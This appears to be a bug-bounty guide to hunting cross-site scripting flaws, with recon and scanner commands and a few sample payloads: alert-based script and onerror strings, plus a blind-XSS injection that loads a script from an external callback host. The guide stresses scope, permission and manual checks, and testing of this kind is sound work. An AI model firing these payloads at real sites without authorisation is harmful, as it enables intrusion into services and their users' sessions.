# XSS Methodologies – Deep Step-by-Step (With Commands)

This document provides **practical XSS hunting methodologies** with
**exact commands**, **tool purpose**, and **what to analyze after each step**.

Run steps manually. Do NOT automate blindly.

---

## METHODOLOGY 1: Manual-First Recon (Base Method)

### Goal
Understand application behavior before automation.

### Steps
1. Browse the application normally
2. Identify inputs:
   - Search
   - Profile fields
   - Filters
   - Comments
3. Intercept requests in Burp Suite
4. Send requests to Repeater
5. Test payloads manually:
```bash
<script>alert(1)</script>

"><img src=x onerror=alert(1)>

";alert(1);//
```
6. Check:
- Reflection
- Storage
- DOM execution

📌 **If manual finds XSS → automation not needed**

---

## METHODOLOGY 2: Historical URL Mining (Forgotten Endpoints)

### Tools
- gau
- waybackurls

### Commands
```bash
gau example.com > gau.txt
waybackurls example.com > wayback.txt
```

Merge & clean:
```bash
cat gau.txt wayback.txt | sort -u > all_urls.txt
```

Extract parameters:
```bash
grep "=" all_urls.txt > params.txt
```

### What to Analyze
- Old search endpoints
- Deprecated APIs
- Debug parameters
- Legacy features

---

## METHODOLOGY 3: Parameter Discovery (Hidden Inputs)

### Tools
- ParamSpider
- SecLists

### Commands

```bash
paramspider -d example.com
```

Output usually saved automatically.

Optional Burp fuzzing:
- Load parameters into Burp Intruder
- Use SecLists:
```bash
SecLists/Discovery/Web-Content/burp-parameter-names.txt
```

### What to Analyze
- Unusual parameter names
- Feature toggles
- Flags like `debug`, `test`, `view`

---

## METHODOLOGY 4: JavaScript-Centric DOM XSS

### Tools
- Katana
- LinkFinder

### Crawl site & JS:
```bash
katana -u https://example.com -jc -o katana.txt
```

Extract JS URLs:
```bash
grep ".js" katana.txt | sort -u > js.txt
```

Extract endpoints from JS:
```bash
python3 linkfinder.py -i https://example.com/app.js -o cli
```

### Manual JS Analysis
Search for sinks:
```bash
innerHTML
document.write
eval
location
setTimeout(
```

### Payload Test
```bash
#<img src=x onerror=alert(1)>
```

---

## METHODOLOGY 5: Smart XSS Automation (Dalfox)

### Tool
- Dalfox

### Commands
Single URL:
```bash
dalfox url "https://example.com/search?q=test"
```

Bulk scan:
```bash
dalfox file params.txt
```


### What to Do Next
- Ignore noise
- Pick 1–2 strong candidates
- Verify manually in browser/Burp

⚠️ Never report Dalfox output directly

---

## METHODOLOGY 6: Fast Reflected XSS Sweep (xss0r)

### Tool
- xss0r

### Command
```bash
xss0r -l params.txt
```


### What to Analyze
- Which parameters reflect input
- HTML vs attribute vs JS context

⚠️ Reflection ≠ XSS  
Manual confirmation is mandatory.

---

## METHODOLOGY 7: Filter Bypass Discovery (XSStrike)

### Tool
- XSStrike

### Command
```bash 
python3 xsstrike.py -u "https://example.com/?q=test"
```

### What XSStrike Helps With
- Filter behavior
- Payload variations
- Encoding tricks

Use output as **inspiration**, not final payload.

---

## METHODOLOGY 8: Template-Based Recon (Nuclei)

### Tool
- Nuclei

### Command
```bash
nuclei -l params.txt -t xss/
```

### Usage Rule
- Recon only
- Manual verification required
- Never submit scanner-only reports

---

## METHODOLOGY 9: Blind XSS (Advanced)

### Tool
- BXSS Hunter

### Injection Points
- Username
- Contact forms
- User-Agent header
- Support tickets

### Example Injection (conceptual)
```bash
"><script src=//bxss-url></script>
```

⚠️ Use ONLY if program explicitly allows Blind XSS

---

## MASTER XSS WORKFLOW (REALISTIC)

Manual browsing  
→ gau + waybackurls  
→ ParamSpider  
→ xss0r  
→ Dalfox  
→ Katana + LinkFinder  
→ Manual verification (Burp + Browser)  
→ Report  

---

## COMMON MISTAKES (AVOID)

- Reporting scanner output
- Skipping manual confirmation
- Ignoring context
- Testing out of scope
- Using harmful payloads

---

## FINAL RULE

Automation finds **surface**  
Manual skill finds **bugs**  
Impact gets **bounties**

---






